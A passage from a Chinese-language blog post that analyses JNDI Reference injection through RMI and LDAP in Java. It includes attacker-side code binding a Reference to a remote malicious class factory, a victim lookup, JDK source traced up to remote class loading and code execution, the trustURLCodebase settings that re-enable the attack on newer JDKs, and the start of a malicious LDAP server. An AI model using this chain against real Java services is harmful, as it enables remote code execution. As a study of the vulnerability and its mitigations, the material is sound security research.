operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> refObjWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看到在实例化<code>Reference</code>对象的时候会传递三个参数进去，这三个参数分别是</p><p>className</p><p>包含此引用所引用的对象的类的全限定名。(ps: 就是恶意类的类名或者全限定类名，经过测试该参数不是必须，为空也行，关键在于第二个参数 也就是classFactory)</p><p>classFactory</p><p>包含用于创建此引用所引用的对象的实例的工厂类的名称。初始化为零。(ps: 第二个参数很重要 一定要写恶意类的全限定类名)</p><p>classFactoryLocation</p><p>包含工厂类的位置。初始化为零。(ps: 也就是恶意类存放的远程地址)</p><p>接下来就来跟入源码看一看</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>className  <span class="token operator">=</span> className<span class="token punctuation">;</span>    addrs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        classFactory <span class="token operator">=</span> factory<span class="token punctuation">;</span>        classFactoryLocation <span class="token operator">=</span> factoryLocation<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>实例化Reference期间就只进行以上这些操作</p><p>实例化ReferenceWrapper的时候同样只进行了简单的赋值操作</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">ReferenceWrapper</span><span class="token punctuation">(</span>Reference var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>wrappee <span class="token operator">=</span> var1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接下来就是通过调用bind方法来将<code>ReferenceWrapper</code>对象注册到rmiregistry中。客户端bind <code>Reference</code>过程结束接下来看rmiregistry这边</p><p>这里呢因为 jdk7u21 和 jdk 8u20两个版本在调试的时候无法在<code>RegistryImpl_Skel</code>的<code>dispatch</code>方法上拦截断点所以 暂时采用jdk 8u221版本来进行演示</p><p>同绑定一个正常的远程对像的差别不大只不过绑定一个正常的远程对象的时候，rmiregistry反序列化服务端传递来的结果是这样的</p><p>![image-20200917231839084](个人学习过程中对RMI JRMP 以及JNDI的一些理解/16.png)</p><p>而绑定<code>Reference</code>的时候rmiregistry反序列化服务端传递来的结果是这样的</p><p>![image-20200917232042385](个人学习过程中对RMI JRMP 以及JNDI的一些理解/17.png)</p><p>可以看到最终注册完成后，二者的区别</p><p>![image-20200917234847316](个人学习过程中对RMI JRMP 以及JNDI的一些理解/18.png)</p><p>普通的远程对象是以一个<code>Proxy</code>对象的形式存在，<code>Reference</code>则是以<code>ReferenceWrapper_Stub</code>对象的形式存在</p><p>接下来来看客户端调用<code>Reference</code>这个远程对象的过程，客户端的代码演示环境为jdk 8u20</p><p>首先看下客户端的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMICustomer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//使用JNDI的方式来lookup远程对象  </span>      <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/refObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其实jndi的<code>InitialContext().lookup()</code> 底层和rmi自己的<code>LocateRegistry.getRegistry().lookup()</code>一样都是调用了<code>RegistryImpl_Stub.lookup()</code>方法但是jndi在此基础上又做了自己的封装，例如在处理rmiregistry返回的<code>ReferenceWrapper_stub</code>对象时，二者的处理方式就不相同。</p><p>rmi无法处理<code>ReferenceWrapper_stub</code>对象，而jndi在接收了rmiregistry返回的<code>ReferenceWrapper_stub</code>对象后，结束当前lookup方法，在其上一层的lookup方法中也就是<code>RegistryContext.lookup()</code>方法里会对返回的<code>ReferenceWrapper_stub</code>进行处理</p><p>来观察下<code>RegistryContext.lookup()</code>方法的具体内容</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">lookup</span><span class="token punctuation">(</span>Name var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegistryContext</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        Remote var2<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//调用RegistryImpl_Stub.lookup()方法</span>            var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NameNotFoundException</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token punctuation">(</span>NamingException<span class="token punctuation">)</span><span class="token function">wrapRemoteException</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fillInStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//反序列化的ReferenceWrapper_stub对象在该方法中被处理</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var1<span class="token punctuation">.</span><span class="token function">getPrefix</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接下来再跟进<code>decodeObject()</code>方法之后</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> Object <span class="token function">decodeObject</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> Name var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//判断返回的ReferenceWrapper_stub是否是RemoteReference的子类，结果为真，返回ReferenceWrapper_stub中的Reference对象</span>        Object var3 <span class="token operator">=</span> var1 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteReference</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>RemoteReference<span class="token punctuation">)</span>var1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> var1<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//接着对Reference对象进行操作</span>        <span class="token keyword">return</span> NamingManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span></code></pre><p><code>NamingManager.getObjectInstance()</code>方法就是处理Reference对像并导致RCE的关键了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Object    <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object refInfo<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>                      Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>    ObjectFactory factory<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">//判断并接收Reference对象</span>    Reference ref <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>refInfo <span class="token keyword">instanceof</span> <span class="token class-name">Reference</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> refInfo<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>refInfo <span class="token keyword">instanceof</span> <span class="token class-name">Referenceable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ref <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Referenceable<span class="token punctuation">)</span><span class="token punctuation">(</span>refInfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Object answer<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String f <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// if reference identifies a factory, use exclusively</span>                        <span class="token comment" spellcheck="true">// 这里会将Reference对象传入并且同时传入全限定类名</span>            factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span>                                                 environment<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// No factory found, so return original refInfo.</span>            <span class="token comment" spellcheck="true">// Will reach this point if factory class is not in</span>            <span class="token comment" spellcheck="true">// class path and reference does not contain a URL for it</span>            <span class="token keyword">return</span> refInfo<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// if reference has no factory, check for addresses</span>            <span class="token comment" spellcheck="true">// containing URLs</span>            answer <span class="token operator">=</span> <span class="token function">processURLAddrs</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>answer <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> answer<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// try using any specified factories</span>    answer <span class="token operator">=</span>        <span class="token function">createObjectFromFactories</span><span class="token punctuation">(</span>refInfo<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>answer <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> answer <span class="token operator">:</span> refInfo<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据观察<code>NamingManager.getObjectInstance()</code>方法的内部实现，关键代码在于这一段 <code>factory = getObjectFactoryFromReference(ref, f);</code></p><p>跟进<code>getObjectFactoryFromReference</code>方法，</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> ObjectFactory <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>    Reference ref<span class="token punctuation">,</span> String factoryName<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IllegalAccessException<span class="token punctuation">,</span>    InstantiationException<span class="token punctuation">,</span>    MalformedURLException <span class="token punctuation">{</span>    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clas <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Try to use current class loader</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//首先会尝试使用AppClassloder从本地加载恶意类，当然肯定是失败的</span>         clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ignore and continue</span>        <span class="token comment" spellcheck="true">// e.printStackTrace();</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// All other exceptions are passed up.</span>    <span class="token comment" spellcheck="true">// Not in class path; try to use codebase</span>    String codebase<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>        <span class="token comment" spellcheck="true">//获取codebase地址</span>            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//该方法内会实例化一个URlClassloader 并从codebase中的地址中的位置去请求并加载恶意类</span>            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到真正负责从远程地址加载恶意类的是第二次的<code>helper.loadClass(factoryName, codebase)</code></p><p>该方法的具体实现如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String codebase<span class="token punctuation">)</span>        <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取当前上下文的Classloader 也就是AppClassloader</span>    ClassLoader parent <span class="token operator">=</span> <span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//实例化一个URLClassloader  </span>  ClassLoader cl <span class="token operator">=</span>             URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token function">getUrlArray</span><span class="token punctuation">(</span>codebase<span class="token punctuation">)</span><span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//去远程加载恶意类</span>    <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> cl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这就是服务端攻击客户端的另一种方式，虽然本质上还是有rmi去访问rmiregistry获取的<code>Reference</code>对象，但是由于JNDI对rmi进行了又一次的封装导致两者对Reference对象的处理不一样，所以客户端只有在使用JNDI提供的方法去访问rmiregistry获取的<code>Reference</code>对象时才会触发RCE。</p><p>这个方法看上去好像很通用，在jdk 8u121版本之前确实如此，但是在jdk 8u121版本以及之后的版本中，此方法默认情况下就不再可用了，因为从jdk 8u121版本开始 增加了对<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的值的校验，而该值默认为false，所以默认情况下想要通过<code>Reference</code>对象来远程加载恶意类的想法是行不通了，</p><p>我们来看一下jdk 8u121版本究竟为了防止远程加载恶意类做了哪些改动</p><p>首先在还没有通过rmi去到rmiregistry获取<code>Reference</code>对象之前，在<code>RegistryContext</code>这个类被加载的时候就执行了以下的静态代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token punctuation">{</span>    PrivilegedAction var0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    String var1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>    trustURLCodebase <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到这里获取了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值为false</p><p>然后当执行进<code>decodeObject()</code>方法，并且准备执行<code>NamingManager.getObjectInstance()</code>方法之前多了以下判断</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> var8<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>trustURLCodebase<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConfigurationException</span><span class="token punctuation">(</span><span class="token string">"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> NamingManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>就是判断了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的值，由于该值为false所以就会跑出异常中止执行</p><p>想要jdk 8u121版本能够正常远程加载就去要加上以下代码</p><pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这样就能又正常的RCE了</p><p>但是在JDK 8u191及以后的版本中客户端lookup以前加上上面的代码之后，从新执行会发现不报错了，但是仍然无法RCE，这是为什么呢，我们继续跟着源码往下看</p><p>在通过了<code>RegistryContext</code>中对<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的判断并执行了NamingManager.getObjectInstance()方法之后，一路正常执行来到了关键的实例化URLClassloader并远程加载恶意类的最后一步，然后你就会发现这里变了</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String codebase<span class="token punctuation">)</span>        <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//此处有增加了一个对trustURLCodebase属性的一个判断，这个trustURLCodebase属性和RegistryContext类</span>  <span class="token comment" spellcheck="true">//中的trustURLCodebase属性完全不同</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>trustURLCodebase<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ClassLoader parent <span class="token operator">=</span> <span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassLoader cl <span class="token operator">=</span>                URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token function">getUrlArray</span><span class="token punctuation">(</span>codebase<span class="token punctuation">)</span><span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> cl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们来看下这个trustURLCodebase的值究竟是怎么获取的</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String TRUST_URL_CODEBASE_PROPERTY <span class="token operator">=</span>            <span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String trustURLCodebase <span class="token operator">=</span>            AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>                <span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">public</span> String <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>TRUST_URL_CODEBASE_PROPERTY<span class="token punctuation">,</span>                            <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span> <span class="token string">"false"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这次获取的是一个名称为<code>TRUST_URL_CODEBASE_PROPERTY</code>的属性值，也就是说我们需要将该值也设置为true才行</p><pre class=" language-java"><code class="language-java"> System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//至于这个com.sun.jndi.ldap.object.trustURLCodebase这个属性会在后续的JNDI Reference的LDAP攻击响亮中讲到。</span> System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>也就是说 在jdk 8u191及其以后的版本中如果想让 JNDI Reference rmi攻击向量成功RCE的话 目标服务器就必须在lookup之前加上以上两行代码</p><p>由此可见在jdk 8u191及其以后的版本中通过这种方式来进行RCE攻击几乎不可能实现了。</p><h2 id="服务端攻击客户端-3"><a href="#服务端攻击客户端-3" class="headerlink" title="服务端攻击客户端 3"></a>服务端攻击客户端 3</h2><p>在上一小节中通过使用JNDI 的Reference rmi攻击向量进行RCE攻击，根据网络上大佬们提供的思路，除了使用rmi攻击向量以外还可以使用JNDI Ldap向量来进行攻击</p><p>话不多说直接上源码，首先先看下Ldap服务端源码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPSeriServer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LDAP_BASE <span class="token operator">=</span> <span class="token string">"dc=example,dc=com"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">1389</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//这里的代码只是在内存中模拟了一个ldap服务，本机上并不存在一个ldap数据库所以程序结束后这些就都消失了</span>            InMemoryDirectoryServerConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span>LDAP_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>                    <span class="token string">"listen"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>                    InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>                    port<span class="token punctuation">,</span>                    ServerSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 